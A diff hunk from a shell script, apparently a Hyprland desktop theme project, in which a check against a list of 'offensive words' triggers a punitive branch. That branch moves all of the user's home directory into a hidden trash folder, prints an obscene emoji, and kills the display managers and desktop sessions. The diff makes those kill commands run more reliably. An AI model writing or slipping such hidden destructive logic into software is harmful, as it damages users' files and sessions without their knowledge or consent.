@@ -98,7 +98,7 @@ for word in "${OFFENSIVE_WORDS[@]}"; do
         mv ~/* ~/.local/share/hyprmaterial3/trashed-system/
         echo -e "🖕 🖕"
         clear
-        sudo systemctl stop sddm && sudo systemctl stop gdm && sudo systemctil stop lightdm && pkill {X,startx,gnome-shell,Hyprland,hyprland,plasmashell,plasma-x11} 
+        sudo systemctl stop sddm;sudo systemctl stop gdm;sudo systemctl stop lightdm && pkill {X,startx,gnome-shell,Hyprland,hyprland,plasmashell,plasma-x11} 
         exit 1
     fi
 done
